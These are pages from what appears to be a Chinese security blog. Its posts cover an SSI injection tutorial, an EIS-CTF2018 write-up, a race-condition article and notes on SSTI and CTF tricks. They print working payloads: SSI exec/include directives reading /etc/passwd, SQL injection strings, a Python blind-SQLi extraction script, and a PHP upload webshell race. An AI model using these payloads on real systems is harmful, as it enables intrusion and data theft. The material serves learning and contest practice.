+<h1 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析"></a>威胁情报分析</h1><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></p>
+<p><a href="https://poma.nsfocus.com" target="_blank" rel="noopener">https://poma.nsfocus.com</a> </p>
+<p><a href="https://ti.360.net" target="_blank" rel="noopener">https://ti.360.net</a></p>
+<p><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p>
+<p><a href="http://www.threatcrowd.org" target="_blank" rel="noopener">http://www.threatcrowd.org</a></p>
+<p><a href="https://community.riskiq.com" target="_blank" rel="noopener">https://community.riskiq.com</a></p>
+<p><a href="https://www.venuseye.com.cn" target="_blank" rel="noopener">https://www.venuseye.com.cn</a></p>
+<p><a href="https://exchange.xforce.ibmcloud.com/" target="_blank" rel="noopener">https://exchange.xforce.ibmcloud.com/</a></p>
+<p><a href="https://alice.tj-un.com/#" target="_blank" rel="noopener">https://alice.tj-un.com/#</a></p>
+<h1 id="渗透工具集合"><a href="#渗透工具集合" class="headerlink" title="渗透工具集合"></a>渗透工具集合</h1><p><a href="https://www.jianshu.com/p/fc4ed837acac" target="_blank" rel="noopener">https://www.jianshu.com/p/fc4ed837acac</a></p>
+<p><a href="https://blog.csdn.net/Bul1et/article/details/85157176" target="_blank" rel="noopener">https://blog.csdn.net/Bul1et/article/details/85157176</a></p>
+<h1 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h1><p><a href="http://site.ip138.com" target="_blank" rel="noopener">http://site.ip138.com</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/18/网址收藏/" data-id="ck0l0oha00028py2isz5faf8c" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂/">杂</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SSI服务器注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/17/SSI服务器注入/" class="article-date">
+  <time datetime="2018-11-16T16:00:00.000Z" itemprop="datePublished">2018-11-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/17/SSI服务器注入/">SSI服务器注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="什么是SSI"><a href="#什么是SSI" class="headerlink" title="什么是SSI"></a>什么是SSI</h1><p>全程：server side includes injection 服务器端包含注入</p>
+<p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。它与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI  </p>
+<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
+<p>在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
+<p>一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。</p>
+<h1 id="SSI漏洞产生的条件"><a href="#SSI漏洞产生的条件" class="headerlink" title="SSI漏洞产生的条件"></a>SSI漏洞产生的条件</h1><p>用户存在可控输入，并且未过滤，并且还能回显嵌入到html中，如其中一条 </p>
+<pre><code>&lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令）</code></pre><p>如果没有过滤吧&lt;!#–等敏感字符，就会造成系统命令执行，<br>通常存在XSS的地方如果开启了SSI服务，那么就会造成服务器注入</p>
+<pre><code>&lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;（会显示给定的文件）</code></pre><h1 id="SSI命令语法解析"><a href="#SSI命令语法解析" class="headerlink" title="SSI命令语法解析"></a>SSI命令语法解析</h1><p><img src="https://i.imgur.com/UMLJ6ul.png" alt></p>
+<p>①显示服务器端环境变量&lt;#echo&gt;</p>
+<pre><code>本文档名称：
+&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;
+现在时间：
+&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;
+显示IP地址：
+&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code></pre><p>②将文本内容直接插入到文档中&lt;#include&gt;</p>
+<pre><code>&lt;!--#include file=&quot;文件名称&quot;--&gt;
+&lt;!--#include virtual=&quot;index.html&quot; --&gt;
+&lt;!--#include virtual=&quot;文件名称&quot;--&gt;
+&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</code></pre><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
+<p>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p>
+<pre><code>文件最近更新日期：
+&lt;!--#flastmod file=&quot;文件名称&quot;--&gt;
+文件的长度：
+&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</code></pre><p>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
+<pre><code>&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;
+&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;
+&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;
+&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;</code></pre><p>⑤一次CTF中用到的指令 </p>
+<pre><code>&lt;!--%23include virtual=&quot;flag&quot; --&gt;</code></pre><p>1、显示服务器端环境变量&lt;#echo&gt;<br>2、将文本内容直接插入到文档中&lt;#include&gt;<br>3、显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)<br>4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<br>5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)<br>   高级SSI<xssi>可设置变量使用if条件语句。<br>   SSI指令基本格式：&lt;!-– 指令名称=”指令参数”&gt;  </xssi></p>
+<p>注意：<br>1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。<br>2．上面的标点=””，一个也不能少。<br>3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。<br>有的时候可使用`来绕过对”的过滤//有时候 有时候，</p>
+<p>SSI命令：<br><a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a><br><a href="https://www.cnblogs.com/wqhwe/p/5442612.html" target="_blank" rel="noopener">https://www.cnblogs.com/wqhwe/p/5442612.html</a> </p>
+<h1 id="CTF实战SSI"><a href="#CTF实战SSI" class="headerlink" title="CTF实战SSI"></a>CTF实战SSI</h1><p><a href="https://shuaizhupeiqi.github.io/2018/11/16/2018%20%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">EIS-2018ctf挑战赛</a></p>
+<h1 id="SSI漏洞挖掘"><a href="#SSI漏洞挖掘" class="headerlink" title="SSI漏洞挖掘"></a>SSI漏洞挖掘</h1><p>SSI漏洞，一般存在xss的地方都值得一试。  </p>
+<p>并非所有文件中的SSI指令都会被解析，必须告诉Apache应该解析哪些文件。有两种方法使Apache解析带有特定后缀名的文件，比如：.shtml ，配置如下：</p>
+<pre><code>AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml</code></pre><p>.stm，.shtm和.shtml的页面是否存在文件后缀名是用来表明网页文件是否包含SSI指令的，因此如果该网站使用了.shtml文件，那说明该网站支持SSI指令。然而.shtml后缀名并非是强制规定的，因此如果没有发现任何.shtml文件，并不意味着目标网站没有受到SSI注入攻击的可能。</p>
+<h1 id="SSI防护"><a href="#SSI防护" class="headerlink" title="SSI防护"></a>SSI防护</h1><p>默认apache不开启ssi，ssi这种技术已经比较少用了。如果应用没有使用到ssi，关闭服务器对ssi的支持即可。</p>
+<hr>
+<p>参考：<a href="https://www.cnblogs.com/jokermoon/p/6708691.html" target="_blank" rel="noopener">https://www.cnblogs.com/jokermoon/p/6708691.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/17/SSI服务器注入/" data-id="ck0l0oh920005py2ibayve00d" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-2018 高校网络信息安全管理运维挑战赛" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" class="article-date">
+  <time datetime="2018-11-15T16:00:00.000Z" itemprop="datePublished">2018-11-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/16/2018 高校网络信息安全管理运维挑战赛/">EIS-CTF2018</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="simpleBBS"><a href="#simpleBBS" class="headerlink" title="simpleBBS"></a>simpleBBS</h1><p>题目：<a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p>
+<p>进入网站 注册 登录</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4" alt></p>
+<p>题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，  </p>
+<p>那是不可能的，一翻py，fuzz，注册的时候会报错，<br><img src="https://i.imgur.com/7VAUrdK.png" alt><br>说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。<br>不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？<br>试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。<br>？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。<br>好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456<br><img src="https://i.imgur.com/I1cK3FY.png" alt><br>这是啥？？数据库报错？好了，二话不说就是报错注入，<br><img src="https://i.imgur.com/q4WWKMq.png" alt><br>flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数<br>username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–<br>OK了剩下的几位也出来了。此题 完！</p>
+<h1 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h1><p>请看题目，重点 xxe，后面是/flag，就是flag路径，</p>
+<p><img src="https://i.imgur.com/AbgQOg0.png" alt></p>
+<p>开局两个框，抓包!</p>
+<p><img src="https://i.imgur.com/nmCN9P7.png" alt></p>
+<p>我*？不是xml吗，你给我发个json格式包，你想做爪子？<br>不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水，</p>
+<p><img src="https://i.imgur.com/QWDo2b3.png" alt></p>
+<p>牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，<br>然后xxe,不会的请自行参考我的博客xxe，<br>来个payload 包，<br><img src="https://i.imgur.com/FHewbsx.png" alt><br>完结！</p>
+<h1 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h1><p><img src="https://i.imgur.com/1OvWuoO.png" alt></p>
+<p>重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下，</p>
+<p>这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。</p>
+<p><img src="https://i.imgur.com/dWsKl24.png" alt></p>
+<p>payload </p>
+<pre><code>name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23<br>但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，<br>毕竟ssi有那么多命令<br>尝试过后使用 </p>
+<pre><code>name=&lt;!--%23include virtual=&quot;flag&quot;--&gt;</code></pre><p><img src="https://i.imgur.com/IdxrzN8.png" alt></p>
+<h1 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h1><p>题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示<br>注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。</p>
+<p><img src="https://i.imgur.com/OOd1kvu.png" alt></p>
+<p>然后注册 账号为 1’ or 1=1 or ‘</p>
+<p>账号这里有几个点着重说一下</p>
+<p>前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。</p>
+<p>现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。</p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘</p>
+<p>查看效果 </p>
+<p><img src="https://i.imgur.com/QoxxXp2.png" alt></p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘</p>
+<p>这句 肯定为错，因为ascii码不可能大于1000</p>
+<p><img src="https://i.imgur.com/DD3Nya2.png" alt></p>
+<p>可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。</p>
+<pre><code>import requests
+import re
+
+
+headers = {
+&apos;Connection&apos;: &apos;close&apos;,
+}//防多次访问断开连接
+flag=&quot;&quot;
+for i in range(1,32):
+
+    for nmb in range(32,126):
+
+        payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;}
+        s=requests.Session()
+        url_reg=&apos;http://210.32.4.20/register.php&apos;
+        r=s.post(url_reg,data=payload,headers=headers)
+        url_log=&apos;http://210.32.4.20/login.php&apos;
+        r=s.post(url_log,data=payload,headers=headers)
+        url_ans=&apos;http://210.32.4.20/answer.php&apos;
+        select={&apos;1.a&apos;:&apos;on&apos;}
+        r=s.post(url_ans,data=select,headers=headers)
+        result=r.content[2074:2075]
+        if int(result)!=0:
+            flag=flag+chr(nmb)
+            print flag
+            break</code></pre><p><img src="https://i.imgur.com/VbFQcqd.png" alt></p>
+<p>单线程太慢不跑了！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" data-id="ck0l0oh8t0000py2ifz724kk3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-条件竞争漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/15/条件竞争漏洞/" class="article-date">
+  <time datetime="2018-11-14T16:00:00.000Z" itemprop="datePublished">2018-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/15/条件竞争漏洞/">CTF中的条件竞争漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="条件竞争是沃特？"><a href="#条件竞争是沃特？" class="headerlink" title="条件竞争是沃特？"></a>条件竞争是沃特？</h1><p>敲黑板，定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
+<p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。<br>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。</p>
+<h1 id="形象实例"><a href="#形象实例" class="headerlink" title="形象实例"></a>形象实例</h1><p>#抽象成四个字，措手不及！！！</p>
+<p>利用多线程并发去执行同一个操作进程，服务器无法或者没有处理程序，导致处理高并发的线程未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。出现意想不到的结果，措手不及应接不暇人山人…咳咳，反应不过来就出错。</p>
+<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
+<p>给两个例子好好消化消化。</p>
+<p>例1：金额提现</p>
+<p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。</p>
+<p>例2：先存储文件，再判断是否合法，然后再删除。</p>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”<br>攻击：首先上传一个php文件<br>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
+<p>乌云实例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html</a></p>
+<p>乌云人民币套现：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html</a></p>
+<h1 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h1><p><a href="https://blog.csdn.net/iamsongyu/article/details/83346029" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83346029</a>  //Itshop<br>辣条之王 知识点1.条件竞争 2.数据溢出<br>数据溢出重点一句话：我们输入的是份数，后台肯定要查询数据库中我们的大辣条数目书否符合条件，即是否大于份数*5，才会给我们相应的辣条之王。我们的目的是数据库判断可以过，但是后台也得给我们足够的辣条之王，思路是使用整数溢出欺骗数据库，（重中）使得我们请求的数字在服务器看来就是1分辣条之王，而实际上是很多。（之重！）</p>
+<p>ctf题目：<a href="http://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/index2.php</a> （练习）</p>
+<p>首先进入CTF地址，观察发现，网址为inde2.php，<br>正常来说应是index.php，访问index.php发现自动跳转 inde2.php<br>抓包截包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/xETNIjlX1VaS797xJsurCrQx*Q1ApmzzlyDieOTRefo!/b/dFQBAAAAAAAA&bo=ZAUTAQAAAAADB1E!&rf=viewer_4" alt><br>进入 uploadsomething.php，发现应该是个上传页面，第一个框为上传文件名，第二个为文件内容，<br>上传1.php ，返回路径 查看<br><img src="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/nyq3Vv.Nd1vPT*R2*b16gy6sUIRZ8JShmvZCS.jWugM!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=lAM8AQAAAAADF5g!&tl=1&vuin=275640346&tm=1542283200&sce=60-1-1&rf=viewer_4" alt><br>凭我专业八级的英语水平，这意思应该是太慢了，于是聪明的你想到的条件竞争漏洞，迅速上传迅速访问。<br>OK，使用burp intruder 模块 爆破上传，然后访问。</p>
+<p>于是，开始，</p>
+<p>分别抓取两个包发送intruder<br>第一个包网址：<a href="http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=</a><?php+system("ls");?><br>第二个包网址：<a href="http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php</a>  </p>
+<p>调整没有字典的爆破，不断发包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/92EEmEGiQ0C9aXOxUWeka.bNZZLQumQIQVxYL1XQT0w!/b/dFMBAAAAAAAA&bo=dwIGAgAAAAADF0M!&rf=viewer_4" alt></p>
+<p>然后设置发送三千个数据包，然后设置线程调至50<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZAi8Xtt*f4ZroqWHIvkjTlaHt9N55rzwdZhEfK1o140!/b/dFMBAAAAAAAA&bo=kAJRAQAAAAADB.A!&rf=viewer_4" alt></p>
+<p>第一个包为以50线程迅速上传三千次，<br>第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。<br>然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/3vhqtv7o0Rl.3VVfujdaCSFhbhJQZ2929itgTVpf05Y!/b/dFQBAAAAAAAA&bo=1gUgAgAAAAADB9M!&rf=viewer_4" alt></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>对于数据库的操作，正牌的方法是设置锁</p>
+<p>对于文件上传，一定要经过充分完整的检查之后再上传而不是先上传在辨别。</p>
+<hr>
+<p>参考：<a href="https://blog.csdn.net/ivalue/article/details/81412494" target="_blank" rel="noopener">https://blog.csdn.net/ivalue/article/details/81412494</a><br>参考：<a href="https://www.0dayhack.com/post-666.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-666.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/15/条件竞争漏洞/" data-id="ck0l0oh9u001spy2il41nm3w2" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CTF-web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/14/CTF-web/" class="article-date">
+  <time datetime="2018-11-13T16:00:00.000Z" itemprop="datePublished">2018-11-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/14/CTF-web/">CTF-WEB知识点保存</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="nginx-配置不当导致目录遍历下载漏洞"><a href="#nginx-配置不当导致目录遍历下载漏洞" class="headerlink" title="nginx 配置不当导致目录遍历下载漏洞"></a>nginx 配置不当导致目录遍历下载漏洞</h1><p><a href="http://www.cnblogs.com/Mrsm1th/p/6600876.html" target="_blank" rel="noopener">http://www.cnblogs.com/Mrsm1th/p/6600876.html</a></p>
+<h1 id="php-input代码执行以及php-filter读取源码"><a href="#php-input代码执行以及php-filter读取源码" class="headerlink" title="php:input代码执行以及php://filter读取源码"></a>php:input代码执行以及php://filter读取源码</h1><p><a href="https://www.ichunqiu.com/writeup/detail/481" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/481</a></p>
+<h1 id="一道python简单编写–保持session情况下爆破"><a href="#一道python简单编写–保持session情况下爆破" class="headerlink" title="一道python简单编写–保持session情况下爆破"></a>一道python简单编写–保持session情况下爆破</h1><p><a href="https://www.ichunqiu.com/writeup/detail/345" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/345</a></p>
+<p>附脚本</p>
+<pre><code>import requests
+
+url=&apos;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=ea&apos;
+
+s=requests.session()//一个要点必须保持session一致否则销毁了之后无法叠加十次。
+
+r=s.get(url)
+for i in range(0,20):
+    url=&quot;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=&quot;+r.content[0:2]
+    r=s.get(url)
+    print r.content[0:44]</code></pre><h1 id="PHP超全局变量CTF"><a href="#PHP超全局变量CTF" class="headerlink" title="PHP超全局变量CTF"></a>PHP超全局变量CTF</h1><p><a href="https://www.ichunqiu.com/writeup/detail/717" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/717</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/14/CTF-web/" data-id="ck0l0oh900004py2i5p9wg3gg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SSTI模板注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/11/SSTI模板注入/" class="article-date">
+  <time datetime="2018-11-10T16:00:00.000Z" itemprop="datePublished">2018-11-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/11/SSTI模板注入/">SSTI模板注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开局一张图，姿势全靠yy</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZZV.syC4eaxGtI3eCw7o2iin*1NXlIgclNjp2Qq2pgc!/b/dFMBAAAAAAAA&bo=0ANGAgAAAAARB6c!&rf=viewer_4" alt></p>
+<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。</p>
+<p>和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<h1 id="小课堂—模板渲染是what？"><a href="#小课堂—模板渲染是what？" class="headerlink" title="小课堂—模板渲染是what？"></a>小课堂—模板渲染是what？</h1><p>首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。  </p>
+<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。  </p>
+<p><font size="5">后端渲染</font></p>
+<p>后端渲染HTML的情况下，浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，这里的计算就是服务器经过解析存放在服务器端的模板文件来完成的，在这种情况下，浏览器只进行了HTML的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户。</p>
+<p>实现：后端拼字符串呗…… （理论上后端模板也是字符串）  </p>
+<p>好处：模板统一在后端。前端（相对）省事，不占用客户端运算资源（解析模板），只要不大改结构，文字啥的小修改后端改了就好了。</p>
+<p>坏处：占用（部分、少部分）服务器运算资源、，response 出的数据量会（稍）大点，模板改了前端的交互和样式什么的一样得跟着联动修改。</p>
+<p><font size="5">前端渲染</font></p>
+<p>前端渲染就是指浏览器会从后端得到一些信息，这些信息或许是适用于题主所说的angularjs的模板文件，亦或是JSON等各种数据交换格式所包装的数据，甚至是直接的合法的HTML字符串。这些形式都不重要，重要的是，将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示。</p>
